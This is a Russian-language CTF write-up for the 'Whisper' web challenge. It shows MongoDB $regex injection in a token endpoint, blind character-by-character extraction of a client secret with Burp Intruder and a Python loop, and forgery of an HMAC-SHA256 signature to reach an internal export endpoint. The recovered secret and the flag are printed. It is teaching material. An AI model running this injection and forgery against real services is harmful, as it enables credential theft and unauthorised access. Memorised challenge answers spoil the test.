# Whisper — Blind Regex Injection

**Категория:** Web
**Уязвимость:** NoSQL-инъекция оператора (`$regex`) → блайнд-эксфильтрация секрета → подделка HMAC-подписи
**Флаг:** `hiCTF{bl1nd_regex_3xfil_then_f0rge_the_cust0m_s1gner_18198ef083}`

## Обзор

В приложении доступны два ключевых эндпоинта:

- `POST /api/token` — выдаёт access-токен по `client_id` и `client_secret`.
- `POST /internal/export` — экспортирует отчёты, требует scope `report:export` и валидную подпись HMAC-SHA256.

На `/clients` видно, что scope `report:export` есть только у клиента `report-signer`, а его секрет неизвестен. Задача — восстановить этот секрет и затем отправить корректно подписанный запрос на `/internal/export`.

## 1. Разведка: схема подписи

Отправляем на `/internal/export` запрос с мусорным `X-Signature` — получаем `401`, но тело ошибки раскрывает точную конструкцию `string_to_sign` и алгоритм подписи, который ожидает сервер.

<img width="1557" height="765" alt="image" src="https://github.com/user-attachments/assets/59df6d15-312d-4e7d-8f30-44d1df90d0f2" />


Сервер сообщает, что канонической строкой является:

```
METHOD \n PATH \n CANONICAL_QUERY \n HEX_SHA256(body) \n X-Timestamp \n nonce
```

а подпись считается как `HMAC-SHA256(client_secret, string_to_sign)` в нижнем регистре (hex). То есть, восстановив секрет, подделать валидную подпись можно детерминированно.

## 2. Обнаружение инъекции и длины секрета

Эндпоинт `/api/token` не проверяет тип поля `client_secret`. Вместо строки он принимает оператор `$regex` в стиле MongoDB и применяет его к сохранённому секрету.

Регулярное выражение, совпадающее с любой строкой из 32 символов, возвращает `200 OK` и валидный токен:

```json
{
  "client_id": "report-signer",
  "client_secret": { "$regex": "^.{32}$" }
}
```

<img width="1555" height="705" alt="image" src="https://github.com/user-attachments/assets/d4d054d7-61d2-4e38-a325-7897351e7114" />


`200` и выданный `access_token` (scope `read report:export`) подтверждают сразу две вещи: секрет можно перебирать через регулярные выражения, и его длина ровно **32 символа**.

## 3. Блайнд-извлечение секрета

Теперь есть рабочий оракул (`200` = регулярка совпала, `401` = не совпала). Секрет восстанавливается посимвольно с помощью regex с якорем и известным префиксом: `^<известное><предположение>.*$`.

Сделано двумя способами:

**Burp Intruder** — атака Sniper, одна позиция подставляется в регулярку (`^§§.{31}$`), набор payload'ов = алфавит. Только верный символ возвращает `200`, все остальные — `401`.

<img width="1885" height="1004" alt="image" src="https://github.com/user-attachments/assets/ffd72da1-1878-4981-ac7e-d73cb40e43d3" />

<img width="1856" height="904" alt="image" src="https://github.com/user-attachments/assets/b8bef286-523e-4b25-b787-3dfd314b6819" />


**Python-автоматизация** — тот же оракул, цикл по 32 позициям и hex-алфавиту:

```python
import requests

url = "https://whisper-b8d0d5955431.chall.hiddeninvestigations.net/api/token"
chars = "0123456789abcdef"
secret = ""

for i in range(32):
    for c in chars:
        data = {
            "client_id": "report-signer",
            "client_secret": {"$regex": f"^{secret}{c}.*$"}
        }
        r = requests.post(url, json=data, timeout=10)
        if r.status_code == 200:
            secret += c
            print(f"[+] Position {i + 1}/32: {secret}")
            break

print(f"\n[+] Full secret: {secret}")
```
<img width="800" height="701" alt="image" src="https://github.com/user-attachments/assets/27be1db0-2335-4475-b083-c084ca0a9648" />


Восстановленный секрет:

```
a864cf4ea9b65cb7e873092ebcf56e9e
```

Проверяем полным regex с якорями `^a864cf4ea9b65cb7e873092ebcf56e9e$` — сервер возвращает `200`, значит секрет точный:

<img width="1629" height="729" alt="image" src="https://github.com/user-attachments/assets/23172129-e1ab-44d6-b207-a99c369f88c1" />


## 4. Подделка HMAC-подписи

Используя раскрытый на шаге 1 формат `string_to_sign` и восстановленный секрет, генерируем подпись для запроса к `/internal/export` с пустым телом:

```python
import hmac, hashlib, time, secrets

secret = "a864cf4ea9b65cb7e873092ebcf56e9e"
timestamp = str(int(time.time()))
nonce = "ctf-" + secrets.token_hex(12)

message = f"POST\n/internal/export\n\n{hashlib.sha256(b'').hexdigest()}\n{timestamp}\n{nonce}"

signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).hexdigest()

print("Timestamp:", timestamp)
print("Nonce:", nonce)
print("Signature:", signature)
```

Тело оставляем пустым, поэтому поле `HEX_SHA256(body)` — это SHA-256 от пустой строки. Canonical query тоже пустая.

<img width="800" height="706" alt="image" src="https://github.com/user-attachments/assets/9f84b1d3-661f-4310-bafb-9da3878a5488" />

## 5. Экспорт → флаг

Передаём сгенерированные значения в заголовках запроса:

```
POST /internal/export HTTP/2
Host: whisper-b8d0d5955431.chall.hiddeninvestigations.net
X-Client-Id: report-signer
X-Timestamp: 1793449277
X-Nonce: ctf-b4877ec168ad2512907e01a0
X-Signature: 5203683829ddb41d95822130823a51268e7bffc620c585e1cd1e61ad9f99ee1b
Content-Length: 0
```

Сервер валидирует подпись и возвращает флаг:

<img width="1597" height="598" alt="image" src="https://github.com/user-attachments/assets/2ab85ef2-2419-419a-b26b-a0c6afb98ab8" />


```json
{
  "ok": true,
  "report": "export authorized",
  "flag": "hiCTF{bl1nd_regex_3xfil_then_f0rge_the_cust0m_s1gner_18198ef083}"
}
```
